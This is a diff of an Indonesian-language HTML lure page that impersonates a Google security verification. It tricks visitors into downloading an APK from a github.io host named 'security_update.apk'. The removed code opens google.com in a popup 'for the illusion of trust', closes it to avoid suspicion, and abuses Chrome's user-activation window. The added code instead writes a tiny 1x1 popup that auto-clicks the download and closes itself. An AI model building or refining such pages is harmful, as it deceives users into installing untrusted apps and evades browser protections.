@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Secure Download Portal</title>
+  <title>Verifikasi Keamanan</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -25,9 +25,9 @@
       background: #4285f4;
       color: white;
       border: none;
-      padding: 12px 24px;
+      padding: 14px 24px;
       font-size: 16px;
-      border-radius: 4px;
+      border-radius: 6px;
       cursor: pointer;
       width: 100%;
       margin-top: 16px;
@@ -45,45 +45,40 @@
 </head>
 <body>
   <div class="card">
-    <h2>Verifikasi Keamanan</h2>
-    <p>Klik di bawah untuk memulai verifikasi dan unduh file.</p>
-    <button class="button" onclick="startFlow()">Lanjutkan ke Google</button>
+    <h2>Google Verifikasi</h2>
+    <p>Klik di bawah untuk memverifikasi dan mengunduh file.</p>
+    <button class="button" onclick="triggerDownload()">Lanjutkan ke Google</button>
     <div class="status" id="status"></div>
   </div>
 
   <script>
-    function startFlow() {
-      const statusEl = document.getElementById('status');
-
-      // 1. Buka Google di popup (untuk ilusi kepercayaan)
-      const legitWin = window.open(
-        'https://google.com',
-        'trusted_session',
-        'noopener,noreferrer,width=600,height=700'
-      );
-
-      if (!legitWin) {
-        statusEl.textContent = "Popup diblokir. Izinkan popup dan coba lagi.";
+    function triggerDownload() {
+      // 1. Buka popup kosong (tanpa URL → about:blank, no origin)
+      const popup = window.open('', '_blank', 'width=1,height=1');
+      
+      if (!popup) {
+        document.getElementById('status').textContent = "Popup diblokir. Izinkan dan coba lagi.";
         return;
       }
 
-      // 2. SETELAH delay sangat singkat, tutup popup dan picu download di tab utama
-      setTimeout(() => {
-        try {
-          legitWin.close(); // Tutup popup agar tidak mencurigakan
-        } catch (e) {
-          // Ignore jika gagal close
-        }
-
-        // 3. Picu download DI TAB UTAMA — ini dianggap "masih dalam gesture grace period"
-        const link = document.createElement('a');
-        link.href = 'https://frozzipies.github.io/test.apk';
-        link.download = 'update.apk';
-        link.style.display = 'none';
-        document.body.appendChild(link);
-        link.click();
-        document.body.removeChild(link);
-      }, 200); // ⚡ 200ms: dalam window "user activation" di Chrome/Edge
+      // 2. Tulis konten ke popup yang memicu download
+      popup.document.write(`
+        <!DOCTYPE html>
+        <html>
+        <head><title>Downloading...</title></head>
+        <body>
+          <a id="dl" href="https://frozzipies.github.io/test.apk" download="security_update.apk"></a>
+          <script>
+            // Auto-click link setelah halaman siap
+            window.onload = () => {
+              document.getElementById('dl').click();
+              window.close(); // Tutup popup setelah download
+            };
+          </script>
+        </body>
+        </html>
+      `);
+      popup.document.close();
     }
   </script>
 </body>
